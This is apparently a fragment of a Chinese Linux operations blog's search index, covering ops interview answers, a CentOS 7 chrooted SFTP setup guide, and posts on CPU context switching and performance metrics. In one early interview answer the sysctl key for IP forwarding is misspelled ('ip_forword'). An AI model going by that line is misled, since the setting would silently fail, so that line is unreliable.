网卡2 IP=10.0.1.11 网关=10.0.1.254 重启网卡生效 route -n vi /etc/sysctl.conf net.ipv4.ip_forword = 1 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:51:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"43. 如果PING不通怎么排查 首先先看看是不是网路接口故障水晶头或是网卡接口接触不良造成，其次检查交换机和路由等网络设备是有故障 是否关闭了防火墙和selinux机制 然后查看网卡和路由和网关是否配置正确 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:52:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"44. docker容器ping不通是什么原因? ifconfig 查看一下docker0网桥，ping一下网桥看看是否通，有可能是网桥配置问题 weave路由器端口6783 安装docker容器的服务器没有关闭防火墙(访问一下安装docker物理机的，是否能访问，如果不能访问就变不能访问docker) docker在创建镜像的时候没有做端口映射(出现这种情况能访问物理机不能访问docker)使用, dockers ps 查看镜像的端口映射情况 端口映射不正确 查看网络配置ping网桥看是否能ping通，有可能是网桥的原因 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:53:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"45. 如果一台办公室内主机无法上网(打不开网站)，请给出你的排查步骤? 首先确定物理链路是否联通正常。 查看本机IP，路由，DNS的设置情况是否达标。 telnet检查服务器的WEB有没有开启以及防火墙是否阻拦。 ping一下网关，进行最基础的检查，通了，表示能够到达服务器。 测试到网关或路由器的通常情况，先测网关，然后再测路由器一级一级的测试。 测试ping公网ip的通常情况(记住几个外部IP)， 测试DNS的通畅。ping出对应IP。 通过以上检查后，还在网管的路由器上进行检查。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:54:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"46. 如果我们的网站打开速度慢请说下您的排查思路? 判断原因 首先我要以用户的身份登录我们的网站，判断问题出现在我们自身原因，还是用户那边的原因。 如果是用户问题有以下几个原因： 用户那边的带宽 用户的浏览器器版本低，安装插件太多 中毒和电脑里的垃圾文件过多 用户主机的主机的性能和操作系统 如果是我们的网站自身问题有一下几个原因 网络带宽 服务器的cpu、硬盘、内存过低服务器负载不起来也就是说服务器自身的性能方面 网站代码不够完善。如mysql语句没有进行优化导致数据库读写耗时 服务器未开启图片压缩 网页太大 死连接过多插件使用及js文件调用频繁网站服务器的速度或是租用空间所在的服务器速度 解决思路 检测服务器速度的快慢 ping命令查看连接到服务器的时间和丢包情况(ping 测试网址的) 查看丢包率(1000个包没有丢一个是最理想的、一般一个速度好的机房丢包率不超过1%) ping值要小同城电信adsl ping平均值绝对不能超过20，一般都在10，跨省的平均值20-40属于正常 ping值要均匀最小值和最大值相差太大说明路由不稳定的表现 查看服务器自身性能 查看cpu的使用率uptime 查看内存情况 free -m 查看I/O读写iostat 磁盘I/O读写等看看是那个进程大量占用系统资源导致我的服务器变慢 看看访问最多的URL和IP有什么特征，如果是恶意URL和IP就把他屏蔽掉如果是善意的就限流有可能是CDN回源量大造成网站无法访问 查看同台服务器上其他网站的打开速度，可以通过查询工具查看和自己在同一台服务器上的网站个数和网址可以看他们打开快慢 电信和联通互访的问题 如果是空间打开时快时慢，有时打不开那就是空间不稳定找空间商解决或是换空间伤，如果是有的地方快有的地方慢应该是网络线路问题，比如电信用户访问放在联通服务器上的网站，联通用户访问放在电信服务器上的网站，解决办吧是：使用双线空间或是多线空间 从网站自身的原因 网站的程序设计结构是否合理是否由于幻灯片代码影响网站打开速度(找程序设计相关人士解决) 网页的设计结构和代码错误(请专业人士进行修改) 网页的内容如：大尺寸图片、大尺寸flash、过多的引用其他网站内容，如果被引用内容的网站速度慢，也影响自身网站把。譬如友情连接可以把对方 的图片放到自己网站上 解决办法 优化图片，限制图片大小尺寸，降低图片质量，减少图片数量 限定图片的格式：jpg，png，gif 减少http的请求数(当打开网页时浏览器会发出很多对象请求，每个对象的加载都会有所延时，如果网页上的对象很多就会花费大量的时间，去除不必要的对象，将临近的图片合成一张，合并css文件) ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:55:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"46. 如何查看二进制文件的内容 我们一般通过 hexdump 命令 来查看二进制文件的内容。 hexdump -C XXX(文件名) -C 是参数 不同的参数有不同的意义 -C 是比较规范的 十六进制和 ASCII 码显示 -c 是单字节字符显示 -b 单字节八进制显示 -o 是双字节八进制显示 -d 是双字节十进制显示 -x 是双字节十六进制显示 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:56:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"47. 你是怎么备份数据的，包括数据库备份？ 在生产环境下，不管是应用数据、还是数据库数据首先在部署的时候就会有主从架构、或者集群，这本身就是属于数据的热备份；其实考虑冷备份，用专门一台服务器做为备份服务器，比如可以用rsync+inotify配合计划任务来实现数据的冷备份，如果是发版的包备份，正常情况下有台发布服务器，每次发版都会保存好发版的包。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:57:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"48. zabbix常用术语你知道几个？ 主机（host）：要监控的网络设备，可由IP或DNS名称指定； 主机组（hostgroup）：主机的逻辑容器，可以包含主机和模板，但同一个组织内的主机和模板不能互相链接；主机组通常在给用户或用户组指派监控权限时使用； 监控项（item）：一个特定监控指标的相关的数据；这些数据来自于被监控对象；item是zabbix进行数据收集的核心，相对某个监控对象，每个item都由\"key\"标识； 触发器（trigger）：一个表达式，用于评估某监控对象的特定item内接收到的数据是否在合理范围内，也就是阈值；接收的数据量大于阈值时，触发器状态将从\"OK\"转变为\"Problem\"，当数据再次恢复到合理范围，又转变为\"OK\"； 事件（event）：触发一个值得关注的事情，比如触发器状态转变，新的agent或重新上线的agent的自动注册等； 动作（action）：指对于特定事件事先定义的处理方法，如发送通知，何时执行操作； 报警升级（escalation）：发送警报或者执行远程命令的自定义方案，如每隔5分钟发送一次警报，共发送5次等； 媒介（media）：发送通知的手段或者通道，如Email、Jabber或者SMS等； 通知（notification）：通过选定的媒介向用户发送的有关某事件的信息；远程命令（remote command）：预定义的命令，可在被监控主机处于某特定条件下时自动执行； 模板（template）：用于快速定义被监控主机的预设条目集合，通常包含了item、trigger、graph、screen、application以及low-level discovery rule；模板可以直接链接至某个主机；应用（application）：一组item的集合； web场景（webscennario）：用于检测web站点可用性的一个活多个HTTP请求；前端（frontend）：Zabbix的web接口； ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:58:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"49. 虚拟化技术有哪些表现形式 完全拟化技术：通过软件实现对操作系统的资源再分配，比较成熟，完全虚拟化代表技术：KVM、ESXI、Hyper-V。 半虚拟化技术：通过代码修改已有的系统，形成一种新的可虚拟化的系统，调用硬件资源去安装多个系统，整体速度上相对高一点，半虚拟化代表技术：Xen。 轻量级虚拟化：介于完全虚拟化、半虚拟化之间，轻量级虚拟化代表技术：Docker。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:59:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"50. 修改线上业务配置文件流程 先告知运维经理和业务相关开发人员 在测试环境测试，并备份之前的配置文件 测试无误后修改生产环境配置 观察生产环境是否正常，是否有报警 完成配置文件更改 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:60:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","运维记事"],"content":"SFTP搭建","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":" 注意 本文内容仅在CentOS 7上进行测试 ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:0:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"前言 文章介绍如何让sftp也可以实现vsftpd虚拟用户的功能。 对于运维来说，我们使用文件传输功能的时候都是优先使用vsftpd，而不是sftp,多数原因我想应该都是因为vsftpd具有虚拟用户的功能，这个功能在针对特定的服务来说是非常友好的。比如php服务降权启动时，被读取文件的文件权限问题。 上述的问题，sftp实际上也是可以解决，借助useradd -o选项实现。 [cxd@0x5c0f ~][0]$ useradd --help 用法：useradd [选项] 登录名 useradd -D useradd -D [选项] 选项： -h, --help 显示此帮助信息并退出 -k, --skel SKEL_DIR 使用此目录作为骨架目录 The skeleton directory, which contains files and directories to be copied in the user\\'s home directory, when the home directory is created by useradd. This option is only valid if the -m (or --create-home) option is specified. If this option is not set, the skeleton directory is defined by the SKEL variable in /etc/default/useradd or, by default, /etc/skel. -m, --create-home 创建用户的主目录 -o, --non-unique 允许使用重复的 UID 创建用户 This option is only valid in combination with the -u option. -s, --shell SHELL 新账户的登录 shell -u, --uid UID 新账户的用户 ID ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:1:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"正文 以下定义WEBServer的基础用户为www,以php为例,php-fpm启动进程所属则为www用户，那么也只能读取www用户所拥有操作权限的文件。 ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:2:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"用户创建 创建sftp登陆用户，使用-o选项，让当前用户保持与www同属主UID、同属组GID $\u003e groupadd -o -g $(id -g www) webapp $\u003e useradd -o -u $(id -u www) -g webapp -m -k $(mktemp -d) -s /bin/false webapp # 此帐号只是sftp使用，所有创建时候添加-k选项，不让useradd复制/etc/skel下内容 帐号创建成功后，可在/etc/passwd中看到该帐号，此时应可以看到他的所属主和属组和www帐号一致 ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:3:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"创建sftp登陆密钥 # 由于ssh-keygen在创建默认密钥时无法更新此路径，因此需要主动创建该目录 $\u003e mkdir /home/webapp/.ssh # 此处授权可以直接授权www:www，为了看起来更清晰，此处授权还是用创建时的用户，但无论使用的是那一个，系统显示都会是www $\u003e chown webapp:webapp /home/webapp/.ssh # 密钥创建 $\u003e su - webapp -s /bin/bash -c \"ssh-keygen -f ~/.ssh/id_rsa -t rsa -b 4096 -N ''\" $\u003e su - webapp -s /bin/bash -c \"cat ~/.ssh/id_rsa.pub \u003e ~/.ssh/authorized_keys \u0026\u0026 chmod 600 ~/.ssh/authorized_keys\" ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:4:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"修改/etc/ssh/sshd_config # 注意此项, 网上的sftp搭建教程基本都是说需要将此项切换为, Subsystem sftp internal-sftp # 切换后将绕过\"管理员可能依赖登录shell配置来阻止某些用户登录\"。但我们上述使用的是重复UID，所以此处不能更改 # 若更改，则会导致共用UID的用户之间可相互登陆。 # 差异参见: https://serverfault.com/questions/660160/openssh-difference-between-internal-sftp-and-sftp-server # 差异参见: http://129.226.226.195/post/21921.html Subsystem sftp /usr/libexec/openssh/sftp-server # 指定匹配用户 Match User webapp # 用chroot将用户的根目录指向到固定位置 ChrootDirectory /sftpdir # -l 指定日志收集 -f 收集内容(应该是) internal-sftp 请参看上述连接自行参悟 ForceCommand internal-sftp -l INFO -f AUTH # 以下其他配置自行参悟 PermitTTY no X11Forwarding no AllowTcpForwarding no PasswordAuthentication no ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:5:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"开始测试 # 上述操作完成后，还需要创建一个chroot目录 $\u003e mkdir /sftpdir $\u003e echo hello \u003e /sftpdir/readme.md # 注意目录属主必须为root,属组可以不是，权限不能超过755 $\u003e chown root.root /sftpdir $\u003e chmod 755 /sftpdir # 重启sshd服务(重载也可以) $\u003e systemctl reload sshd ## 登陆测试 $\u003e sftp -i /home/webapp/.ssh/id_rsa webapp@127.0.0.1 The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:hQkISJWcE+gHf1WAT2bIWSwiAJRD81Bv3wZd+1vZOuU. ECDSA key fingerprint is MD5:0e:e5:1a:c7:6c:97:fb:48:95:d2:c9:86:bb:d0:7d:91. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts. Connected to 127.0.0.1. sftp\u003e ls -l -rw-r--r-- 1 0 0 6 Dec 8 06:31 readme.md sftp\u003e pwd Remote working directory: / sftp\u003e ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:6:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"后续 至此，sftp搭建完成, 当然由于 /目录属主为root,sftp目前只能登陆，无法上传，需要在/sftpdir目录下创建目录，然后授权www用户即可，在该目录下进行增、删、改操作。 ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:7:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":"其他问题 为什么使用sftp: sftp使用加密传输认证信息和传输的数据，相对ftp而言更为安全一点. 目录映射: 虚拟用户实现了，那该如何实现目录映射呢，软连接还是每个目录单独建一个用户？其实都不是，我们只需要借助mount命令的bind属性即可，具体使用方式请自行参悟(http://blog.0x5c0f.cc/2019/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/#mount---bind) 帐号管理: 共UID帐号(webapp)直接删除时候基本都会有提示，如果主帐号www正在使用(如php、nginx)，那么删除的时候就会提示无法删除，此时我们只需要强制删除即可(userdel的-f选项)，并不会影响主帐号和其他帐号(注:这个我只在CentOS 7上进行过测试，理论上所有发行版是一致的) 日志查看: tail -f /var/log/secure ","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/:8:0","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","整理收集"],"content":"Linux性能指标之cpu上下文切换","date":"2022-09-01","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/","tags":["linux","解决方案"],"title":"Linux性能指标之cpu上下文切换","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/"},{"categories":["linux","整理收集"],"content":" 透过现象看本质 CPU上下文切换 https://blog.csdn.net/qq_34556414/article/details/107094209 CPU上下文切换是保证Linux系统正常工作的一个核心功能，按照不同场景，可以分为进程上下文切换、线程上下文切换和中断上下文切换。究竟怎么分析CPU上下文切换的问题。 过多的上下文切换，会把CPU时间消耗在寄存器、内核栈以及虚拟内存等数据的保存和恢复上，缩短进程真正运行的时间，成了系统性能大幅下降的一个元凶。 既然上下文切换对系统性能影响那么大，到底要怎么査看上下文切换呢？可以使用vmstat这个工具，来查询系统的上下文切换情况。 vmstat是常用的系统性能分析工具，主要用来分析系统的内存使用情况，也常用来分析 CPU 上下文切换和中断的次数。 [root@0x5c0f ~][0]$ vmstat 2 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 4 0 0 10895260 13356 7206976 0 0 34 24 186 109 4 2 94 0 0 2 0 0 10944452 13356 7179112 0 0 0 14 3414 3917 4 2 94 0 0 0 0 0 10940036 13356 7179008 0 0 0 1404 2930 3534 4 2 95 0 0 0 0 0 10953532 13356 7168816 0 0 0 114 2823 3232 3 2 95 0 0 procs（进程） r：当前运行队列中线程的数目，代表线程处于可运行状态，但CPU还未能执行，这个值可以作为判断CPU是否繁忙的一个指标；当这个值超过了CPU数目，就会出现CPU瓶颈了；这个我们可以结合top命令的负载值同步评估系统性能（等待运行的进程数（(Running or Runnable)是就绪队列的长度，也就是正在运行和等待CPU的进程数）） b：处在非中断睡眠状态的进程数 system（系统）这2个值越大，会看到由内核消耗的CPU时间会越大 in：(interrupt)则是每秒中断的次数，包括时钟中断 cs： (context switch)是每秒上下文切换的次数 cpu（以百分比表示） us：用户进程执行时间(user time)； sy：系统进程执行时间(system time)； id：空闲时间(包括IO等待时间)； wa：等待IO时间；wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈。 r： 表示运行队列(就是说多少个进程真的分配到CPU)，我测试的服务器目前CPU比较空闲，没什么程序在跑，当这个值超过了CPU数目，就会出现CPU瓶颈了。这个也和top的负载有关系，一般负载超过了3就比较高，超过了5就高，超过了10就不正常了，服务器的状态很危险。top的负载类似每秒的运行队列。如果运行队列过大，表示你的CPU很繁忙，一般会造成CPU使用率很高。 cs：每秒上下文切换次数，例如我们调用系统函数，就要进行上下文切换，线程的切换，也要进程上下文切换，这个值要越小越好，太大了，要考虑调低线程或者进程的数目,例如在apache和nginx这种web服务器中, 我们一般做性能测试时会进行几千并发甚至几万并发的测试，选择web服务器的进程可以由进程或者线程的峰值一直下调，压测，直到cs到一个比较小的值，这个进程和线程数就是比较合适的值了. 系统调用也是，每次调用系统函数，我们的代码就会进入内核空间，导致上下文切换，这个是很耗资源，也要尽量避免频繁调用系统函数。上下文切换次数过多表示你的CPU大部分浪费在上下文切换，导致CPU干正经事的时间少了，CPU没有充分利用，是不可取的。 vmstat只给出了系统总体的上下文切换情况，要想查看每个进程的详细情况，就需要使用pidstat 了。给它加上-w选项，你就可以查看每个进程上下文切换的情况了。 [root@0x5c0f ~][130]$ pidstat -w 5 Linux 5.14.18-100.fc33.x86_64 (0x5c0f) 2022年09月01日 _x86_64_ (8 CPU) 15时54分47秒 UID PID cswch/s nvcswch/s Command 15时54分52秒 0 2 0.20 0.00 kthreadd 15时54分52秒 0 13 0.60 0.00 ksoftirqd/0 15时54分52秒 0 14 91.42 0.00 rcu_sched 15时54分52秒 0 15 0.20 0.00 migration/0 15时54分52秒 0 18 0.20 0.00 migration/1 15时54分52秒 0 19 0.60 0.00 ksoftirqd/1 这个结果中有两列内容是我们的重点关注对象。 一个是cswch,表示每秒自愿上下文切换 (voluntary context switches)的次数，另一个则是nvcswch ,表示每秒非自愿上下文切换 (non voluntary context switches)的次数 所谓自愿上下文切换，是指进程无法获取所需资源，导致的上下文切换。比如说，I/O、内存等系统资源不足时，就会发生自愿上下文切换。 而非自愿上下文切换，则是指进程由于时间片巳到等原因，被系统强制调度，进而发生的上下文切换。比如说，大量进程都在争抢CPU时，就容易发生非自愿上下文切换。 这两列如果数值比较大意味着不同的性能问题: 自愿上下文切换时说明进程在等待资源，有可能发生了I/O等问题 非自愿上下文切换，说明进程在被强制调度，也就是在争抢CPU 中断次数多了，说明CPU在被中断处理程序占用。可以通过/proc/interrupts 查看 ","date":"2022-09-01","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/:0:0","tags":["linux","解决方案"],"title":"Linux性能指标之cpu上下文切换","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87%E4%B9%8Bcpu%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/"},{"categories":["linux","整理收集"],"content":"Linux性能测试之性能测试指标","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":" Linux 性能测试之性能测试指标详解(原文) https://blog.csdn.net/u010521062/article/details/115908166 前言 性能测试指标是衡量系统性能的评价标准，常用的系统性能测试指标包括：响应时间、并发用户/并发、点击率、吞吐量、TPS/QPS、PV/UV；Linux服务器常用的性能指标包括：CPU使用率、内存占用率、磁盘IO、系统平均负载等。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:0:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"1. 系统性能测试指标 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:1:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"1.1. 响应时间 响应时间是指某个请求或操作从发出到接收到反馈所消耗的时间，包括应用服务器（客户端）处理时间、网络传输时间以及数据库服务器处理时间。比如一个页面从点击/输入到完全加载的时间；完成一次增加、删除、修改或者查询动作的事务响应时间等。 一个请求在网络上的传输往往要经历多个网络节点才能到达目标服务器，我们假设请求经历了三个网络节点的传输时间B1、B2、B3，客户端的处理时间为A，服务器的响应时间为C。则一次请求的完整路径可以描述为下图： graph RL; 服务器C --\u003e|反馈|节点B3--\u003e节点B2--\u003e节点B1--\u003e|反馈|客户端A 客户端A --\u003e|请求| 节点B1--\u003e节点B2--\u003e节点B3--\u003e|请求|服务器C graph RL; 服务器C --\u003e|反馈|节点B3--\u003e节点B2--\u003e节点B1--\u003e|反馈|客户端A 客户端A --\u003e|请求| 节点B1--\u003e节点B2--\u003e节点B3--\u003e|请求|服务器C客户端从发出请求到接收到服务器反馈的完整链路时间为A—\u003eB1—\u003eB2—\u003eB3—\u003eC（节点处理时间都包括接收和发送两个过程）。 则请求的响应时间为： 响应时间=A+B1+B2+B3+C ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:2:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"1.2. 并发 并发是指多个用户在同一时期内进行相同的事务处理或操作。由于用户在进行一系列操作流程时有一定的时间间隔（即用户思考时间）或者服务器处理请求有先后顺序，于是，就产生了绝对并发和相对并发概念的区分。 绝对并发是指同一时刻（即同一时间点）并发用户对服务器同时发送请求。 相对并发是指一段时间内（即同一时间区间）并发用户对服务器发送请求。 举个例子，一个并发量为10000人（可同时容纳10000人）的动物园，这里的并发量是指绝对并发还是相对并发呢？我们很容易理解，这个并发指的是相对并发，因为整个动物园是一个交织的网状结构，出入口、老虎、狮子、大象等各个动物站点都有分流的作用，基本不可能出现出入口或者站点能够同时承载10000人的情况，出入口的并发可能只有200人。 因此这个动物园的例子里，并发量10000是指各个节点的总和，参观者参观动物园有路径的先后顺序，是相对并发的概念。而出入口的并发量是200人，则是指同一时间在出入口能够同时容纳200人，这就是绝对并发的概念。 TODO: 这里缺少一张图 一般来说，在系统的性能测试中，系统或者模块的并发更多是指相对并发，而接口的并发更倾向于绝对并发。并发性能的概念是指系统、模块或接口稳定运行，不抛出异常情况下所能够承载的并发量。 在并发性能测试中常用到并发用户数和并发请求数两个指标。顾名思义，并发用户数是指同一时间（点或区间），系统、模块或接口能够承载的用户数量；并发请求数是指同一时间（点或区间），系统、模块或接口能够承载的请求数量。 ","date":"2022-08-22","objectID":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/:3:0","tags":["linux","解决方案"],"title":"Linux性能测试之性能测试指标(转载)","uri":"/posts/linux/linux%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E6%8C%87%E6%A0%87/"},{"categories":["linux","整理收集"],"content":"1.3. 点击量/点击率 点击量是衡量网站流量的一个指标，也就是点击数clicks，是对网站点击数据的统计。 点击率（Clicks Ratio）也可以叫做点进率（Click-through Rate），它是网站上某一内容被点击的次数与整个网站内容被显示次数之比，即clicks/views。反应了网站上某一页面或内容的受关注程度，经常用来衡量广告的吸引程度。比如公众号的一篇文章被浏览了10w次，文章中的广告链接被点击了2000次，那么这条广告的点击率是2%（2000/100000*100%）。 在性能测试领域，点击率（hit rate）常指单位时间内（每秒钟）页面的点击数，即每秒钟发送的http请求数量，点击率越大对服务器造成的压力也越大，对服务器的性能要求也越高。 有些人容易混淆点击率和点击量的概念，比如我们经常会听到有人说某网站的点击率是多多万，实际上这里的点击率指的是点击量，曝光率或者说页面浏览量。 